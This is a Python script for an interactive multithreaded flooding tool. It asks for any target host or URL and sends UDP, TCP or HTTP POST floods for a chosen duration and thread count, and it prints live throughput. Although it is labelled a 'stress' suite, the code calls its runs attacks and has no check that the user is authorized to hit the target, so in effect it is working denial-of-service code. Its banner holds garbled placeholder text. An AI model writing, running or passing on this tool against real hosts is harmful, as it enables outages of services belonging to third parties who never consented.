import time
import socket
import threading
import os
import sys
from colorama import Fore, init

init(autoreset=True)

class StressAnalytics:
    def __init__(self):
        self.total_bytes = 0
        self.total_packets = 0
        self.start_time = time.time()
        self.lock = threading.Lock()

    def log_sent(self, size):

        self.total_bytes += size
        self.total_packets += 1

    def get_snapshot(self):
        elapsed = time.time() - self.start_time
        if elapsed <= 0: 
            return 0, 0, 0
        mbps = (self.total_bytes * 8) / (elapsed * 1_000_000)
        pps = self.total_packets / elapsed
        total_mb = self.total_bytes / 1_000_000
        return mbps, pps, total_mb

class NetworkStressSuite:
    def __init__(self):
        self.banner = f"""{Fore.RED}
    ┌──────────────────────────────────────────────────────────┐
    │          funky      │
    │       [ddd           │
    └──────────────────────────────────────────────────────────┘"""

    def udp_flood_aggressive(self, ip, port, payload, end_time, analytics):

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 2)
        except:
            pass

        sendto = sock.sendto
        target = (ip, port)
        
        while time.time() < end_time:
            try:
                sendto(payload, target)

                analytics.total_bytes += len(payload)
                analytics.total_packets += 1
            except:
  
                time.sleep(0.001)
        sock.close()

    def tcp_flood_aggressive(self, ip, port, payload, end_time, analytics):
        
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1) 
                
                sock.connect_ex((ip, port)) 
                
                sock.send(payload)
                analytics.total_bytes += len(payload)
                analytics.total_packets += 1
                sock.close()
            except:
               
                pass

    def http_flood_aggressive(self, url, payload, end_time, analytics):

        parsed_url = url.replace("http://", "").replace("https://", "")
        if "/" in parsed_url:
            host = parsed_url.split("/")[0]
            path = "/" + "/" .join(parsed_url.split("/")[1:])
        else:
            host = parsed_url
            path = "/"

        http_request = f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: {len(payload)}\r\nConnection: Keep-Alive\r\n\r\n".encode()

        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((host, 80))
                sock.send(http_request)
                sock.send(payload)
                analytics.total_bytes += len(http_request) + len(payload)
                analytics.total_packets += 1
                sock.close()
            except:
                pass

    def start_interactive_test(self):
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
        except:
            pass
            
        print(self.banner)
        print(f"{Fore.CYAN}WARNING: This tool is optimized for maximum aggression.")
        print(f"{Fore.YELLOW}High thread counts may crash this container due to CPU limits.\n")
        
        try:
            target_input = input(f"{Fore.YELLOW}Target IP/Host/URL: ")
            if not target_input:
                print(f"{Fore.RED}[!] No target entered. Exiting.")
                return

            method = input(f"{Fore.YELLOW}Method (udp/tcp/http) [udp]: ").lower() or "udp"
            
            if method not in ['udp', 'tcp', 'http']:
                print(f"{Fore.RED}[!] Invalid method. Defaulting to UDP.")
                method = 'udp'

            port = 80
            url = ""
            if method == 'http':
                if not target_input.startswith(('http://', 'https://')):
                    url = f"http://{target_input}"
                else:
                    url = target_input
                print(f"{Fore.CYAN}[*] HTTP Method selected. Port input skipped (using 80).")
            else:
                try:
                    port_input = input(f"{Fore.YELLOW}Target Port: ")
                    port = int(port_input) if port_input.isdigit() else 80
                except ValueError:
                    print(f"{Fore.RED}[!] Invalid port. Defaulting to 80.")
                    port = 80

            try:
                duration = int(input(f"{Fore.YELLOW}Duration (seconds): "))
            except ValueError:
                print(f"{Fore.RED}[!] Invalid duration. Defaulting to 60 seconds.")
                duration = 60

            try:
                threads_input = input(f"{Fore.YELLOW}Thread Count (WARNING: High values crash containers! Suggested 50-200): ")
                threads = int(threads_input) if threads_input.isdigit() else 50
            except ValueError:
                print(f"{Fore.RED}[!] Invalid thread count. Defaulting to 50.")
                threads = 50

            try:
                packet_size_input = input(f"{Fore.YELLOW}Packet Size (bytes) [64-1450]: ")
                packet_size = int(packet_size_input) if packet_size_input.isdigit() else 1024
            except ValueError:
                print(f"{Fore.RED}[!] Invalid packet size. Defaulting to 1024.")
                packet_size = 1024

            target_ip = ""
            if method != 'http':
                try:
                    target_ip = socket.gethostbyname(target_input)
                    print(f"{Fore.GREEN}[+] Target resolved: {target_input} -> {target_ip}")
                except socket.gaierror:
                    print(f"{Fore.RED}[!] Could not resolve host: {target_input}")
                    return
            else:
                target_ip = "HTTP Target"
                print(f"{Fore.GREEN}[+] HTTP Target set: {url}")

            print(f"{Fore.CYAN}[*] Pre-generating payload buffer...")
            payload = os.urandom(packet_size)

            analytics = StressAnalytics()
            end_time = time.time() + duration
            
            print(f"\n{Fore.RED}[*] INITIATING AGGRESSIVE {method.upper()} ATTACK ON {target_input}")
            print(f"{Fore.RED}[*] THREADS: {threads} | PACKET SIZE: {packet_size} | DURATION: {duration}s")
            print(f"{Fore.YELLOW}[!] WARNING: High CPU usage expected. Monitor your container.")

            for _ in range(threads):
                if method == 'udp':
                    t = threading.Thread(target=self.udp_flood_aggressive, 
                                         args=(target_ip, port, payload, end_time, analytics),
                                         daemon=True)
                elif method == 'tcp':
                    t = threading.Thread(target=self.tcp_flood_aggressive, 
                                         args=(target_ip, port, payload, end_time, analytics),
                                         daemon=True)
                elif method == 'http':
                    t = threading.Thread(target=self.http_flood_aggressive, 
                                         args=(url, payload, end_time, analytics),
                                         daemon=True)
                else:
                    continue
                t.start()
                
            print(f"\n{Fore.WHITE}{'Time':<8} | {'Mbps':<12} | {'PPS':<15} | {'Total MB Sent'}")
            print("-" * 60)
            
            try:
                while time.time() < end_time:
                    time.sleep(1)
                    mbps, pps, total_mb = analytics.get_snapshot()
                    elapsed = int(time.time() - analytics.start_time)
                    print(f"{Fore.GREEN}{elapsed:<7}s | {mbps:<12.2f} | {pps:<15.0f} | {total_mb:.2f} MB")
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}[!] Test aborted by user.")

            final_mbps, final_pps, final_total = analytics.get_snapshot()
            print(f"\n{Fore.YELLOW}─── FINAL RESULTS ───")
            print(f"Peak Throughput: {final_mbps:.2f} Mbps")
            print(f"Average PPS: {final_pps:.0f}")
            print(f"Total Transferred: {final_total:.2f} MB")
            print(f"\n{Fore.RED}[!] Attack completed. Exiting.")

        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Input interrupted. Exiting.")
        except Exception as e:
            print(f"{Fore.RED}[!] An error occurred: {str(e)}")

if __name__ == "__main__":
    NetworkStressSuite().start_interactive_test()